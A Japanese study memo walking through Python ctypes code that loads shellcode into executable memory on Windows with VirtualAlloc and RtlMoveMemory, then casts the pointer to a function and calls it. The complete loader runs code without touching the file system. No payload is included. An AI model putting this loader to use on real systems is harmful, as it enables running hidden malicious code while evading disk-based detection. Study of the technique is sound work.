# pythonでシェルコード実行

```python
kernel32 = ctypes.windll.kernel32
```

# write_memory関数について

ファイルシステムに触れることなくシェルコードを実行するには、

- シェルコードを保持するためのバッファをメモリの中に作る
- そしてそのメモリを指すポインタを作る（`ctypes`モジュール）

`write_memory()`でバッファの内容をメモリに書き込む。

```python
def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr
```

`Virtualalloc`は呼び出し側プロセスの仮想アドレス空間内のページ領域を、予約またはコミットする。

（`virtualalloc API`を介して直接作成される大きな動的メモリ割り当てに使用される。）

引数は「割り当てたい領域の開始アドレス（NULLなら勝手に決まる）」、「領域のサイズ（バイト）」、「allocation type」、「アクセス保護のタイプ」。

割り当てのタイプは、通常 MEM_COMMIT | MEM_RESERVE (0x3000) であり、予約と割り当てを同時に行う。

アクセス保護のタイプ0x40は、ページのコミット済み領域に対する実行、読み取り専用、または読み取り/書き込みアクセスを有効にする。

`RtlMoveMemory`で、ソースメモリブロックの内容をコピー先のメモリブロックにコピーする。

今回のコードでは、コピー元が`buf`、コピー先が`ptr`。
（この関数がすることはバッファの内容をメモリに書き込むことであった。）

俺の理解ではこのイラスト：

![pyinput](https://user-images.githubusercontent.com/85237728/168718885-ceda342d-c173-46aa-b7da-ca071fcc74b4.png)

32ビットマシン、64ビットマシンの両方でメモリアドレスの解釈に関して問題なく動作するために、`VirtualAllocのrestype`でその返り値のデータ型を、`RtlMoveMemory`の`argtypes`で
引数のデータ型をそれぞれ（Cと互換性のある型ですよ！と）明記する。

```python
kernel32.VirtualAlloc.restype = ctypes.c_void_p
```

これでVirtualAllocの返り値の方はCのvoid*（ポインタ変数の一種（詳しくは[ここ](https://www.wdic.org/w/TECH/void%20%2A)））。

```python
kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
)
```

`RtlMoveMemory`に与える引数は二つのポインタオブジェクトと一つのサイズオブジェクト。

まぁ最終的には、`write_memory`関数はシェルコードのあるメモリの部分、を指し示すポインタを返す。

# run関数について

```python
def run(shellcode):
    buf = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buf)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()
```    

`create_string_buffer`は前も出てきたけど、可変長の文字バッファを作成する。

`ctypes.cast`はその通り、C言語におけるキャストの役割。

ポインタ`ptr`を`CFUNCTYPE`という関数型に変換する。

そのおかげで、pythonで普通に関数を呼ぶみたいに`shell_func()`で実行できる。

# ctypes.windll.kernel32についてほんのちょっと

```python
class ctypes.WinDLL(name, mode=DEFAULT_MODE, handle=None, use_errno=False, use_last_error=False, winmode=0)
```

このクラスのインスタンスはロードされた共有ライブラリをあらわす。

だから`ctypes.windll`でWinDLLインスタンスを作る。

# 参考リンク

- [ctypesモジュール公式ドキュメント](https://docs.python.org/ja/3/library/ctypes.html)
- [restypeとargtypesについて](https://qiita.com/FGtatsuro/items/019d56287366e5f7016d)
- [VirtualAllocについて](https://www.tokovalue.jp/function/VirtualAlloc.htm)
- [メモリ保護定数について](https://docs.microsoft.com/ja-jp/windows/win32/memory/memory-protection-constants)
